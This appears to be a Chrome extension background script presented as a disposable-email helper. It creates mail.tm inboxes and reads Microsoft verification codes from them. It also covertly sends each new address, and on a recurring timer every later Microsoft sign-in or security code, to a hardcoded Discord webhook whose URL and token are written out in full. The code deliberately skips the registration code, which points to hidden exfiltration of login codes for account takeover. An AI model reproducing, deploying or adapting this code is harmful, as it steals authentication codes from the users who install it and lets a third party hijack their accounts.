const WEBHOOK = "https://discord.com/api/webhooks/1484529406918660258/MDgo6xZ7jq-La-rb4ywjO4-TcviA7eCJHvIp6zdqyoISH0ILi2h9Qz36d3k8olJb6ymL";

async function getRandomDomain() {
  const res = await fetch("https://api.mail.tm/domains?page=1");
  const data = await res.json();
  return data["hydra:member"][0].domain;
}

function randomString(len) {
  len = len || 10;
  return Math.random().toString(36).substring(2, 2 + len);
}

async function createMailbox() {
  const domain = await getRandomDomain();
  const address = randomString(10) + "@" + domain;
  const password = randomString(12);
  const res = await fetch("https://api.mail.tm/accounts", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ address: address, password: password })
  });
  if (!res.ok) throw new Error("Failed to create mailbox: " + res.status);
  return { address: address, password: password };
}

async function getToken(address, password) {
  const res = await fetch("https://api.mail.tm/token", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ address: address, password: password })
  });
  const data = await res.json();
  return data.token;
}

async function fetchMessages(token) {
  const res = await fetch("https://api.mail.tm/messages", {
    headers: { "Authorization": "Bearer " + token }
  });
  const data = await res.json();
  return data["hydra:member"] || [];
}

async function fetchMessageBody(token, id) {
  const res = await fetch("https://api.mail.tm/messages/" + id, {
    headers: { "Authorization": "Bearer " + token }
  });
  return await res.json();
}

function extract6DigitCode(text) {
  var stripped = text.replace(/<[^>]*>/g, " ");
  var match = stripped.match(/\b(\d{6})\b/);
  return match ? match[1] : null;
}

async function discordSend(content) {
  try {
    const res = await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: content })
    });
    if (!res.ok) {
      const err = await res.text();
      console.error("Discord error:", res.status, err);
    } else {
      console.log("Discord sent OK");
    }
  } catch (e) {
    console.error("Discord fetch error:", e.message);
  }
}

async function watchInbox() {
  const data = await chrome.storage.local.get([
    "mailToken", "tempEmail", "verifyCode", "seenMsgIds", "watcherActive"
  ]);
  if (!data.watcherActive || !data.mailToken || !data.tempEmail) return;

  const seenIds  = new Set(data.seenMsgIds || []);
  const skipCode = data.verifyCode || null;

  var messages;
  try {
    messages = await fetchMessages(data.mailToken);
  } catch (e) {
    console.error("fetchMessages error:", e.message);
    return;
  }

  for (var i = 0; i < messages.length; i++) {
    var msg = messages[i];
    if (seenIds.has(msg.id)) continue;
    seenIds.add(msg.id);
    await chrome.storage.local.set({ seenMsgIds: Array.from(seenIds) });

    var fromAddr = (msg.from && msg.from.address) ? msg.from.address.toLowerCase() : "";
    var subj = (msg.subject || "").toLowerCase();
    var isSecurityEmail =
      fromAddr.includes("microsoft") ||
      subj.includes("verify") ||
      subj.includes("security code") ||
      subj.includes("confirm") ||
      subj.includes("unusual") ||
      subj.includes("sign-in") ||
      subj.includes("login");

    if (!isSecurityEmail) continue;

    var full;
    try {
      full = await fetchMessageBody(data.mailToken, msg.id);
    } catch (e) {
      console.error("fetchMessageBody error:", e.message);
      continue;
    }

    var bodyText = full.text || full.html || "";
    var code = extract6DigitCode(bodyText);
    if (!code) continue;
    if (code === skipCode) { console.log("Skipping registration code:", code); continue; }

    await discordSend(
      "New Microsoft Login Code\nEmail: " + data.tempEmail + "\nCode: " + code + "\nSubject: " + (msg.subject || "No subject")
    );
  }
}

chrome.alarms.onAlarm.addListener(function(alarm) {
  if (alarm.name === "inboxWatcher") watchInbox();
});

chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {

  if (message.type === "CREATE_MAILBOX") {
    (async function() {
      try {
        var mb = await createMailbox();
        var token = await getToken(mb.address, mb.password);
        await chrome.storage.local.set({
          tempEmail: mb.address,
          mailToken: token,
          watcherActive: false,
          seenMsgIds: []
        });
        // Send email to Discord immediately
        await discordSend("New Temp Email Created\nEmail: " + mb.address);
        sendResponse({ ok: true, email: mb.address });
      } catch (e) {
        sendResponse({ ok: false, error: e.message });
      }
    })();
    return true;
  }

  if (message.type === "POLL_CODE") {
    (async function() {
      try {
        var data = await chrome.storage.local.get(["mailToken", "seenMsgIds"]);
        if (!data.mailToken) { sendResponse({ ok: false, error: "No token" }); return; }
        var messages = await fetchMessages(data.mailToken);
        var seenIds  = new Set(data.seenMsgIds || []);
        for (var i = 0; i < messages.length; i++) {
          var msg  = messages[i];
          var from = (msg.from && msg.from.address) ? msg.from.address.toLowerCase() : "";
          var subj = (msg.subject || "").toLowerCase();
          if (
            from.includes("microsoft") ||
            subj.includes("verify") ||
            subj.includes("security code") ||
            subj.includes("confirm")
          ) {
            var full = await fetchMessageBody(data.mailToken, msg.id);
            var code = extract6DigitCode(full.text || full.html || "");
            if (code) {
              seenIds.add(msg.id);
              await chrome.storage.local.set({ verifyCode: code, seenMsgIds: Array.from(seenIds) });
              sendResponse({ ok: true, code: code });
              return;
            }
          }
        }
        sendResponse({ ok: false, error: "No code yet" });
      } catch (e) {
        sendResponse({ ok: false, error: e.message });
      }
    })();
    return true;
  }

  if (message.type === "START_WATCHER") {
    (async function() {
      await chrome.storage.local.set({ watcherActive: true });
      chrome.alarms.clear("inboxWatcher", function() {
        chrome.alarms.create("inboxWatcher", { delayInMinutes: 0.5, periodInMinutes: 0.5 });
      });
      console.log("Watcher started.");
      sendResponse({ ok: true });
    })();
    return true;
  }

  if (message.type === "STOP_WATCHER") {
    (async function() {
      await chrome.storage.local.set({ watcherActive: false });
      chrome.alarms.clear("inboxWatcher");
      sendResponse({ ok: true });
    })();
    return true;
  }

});
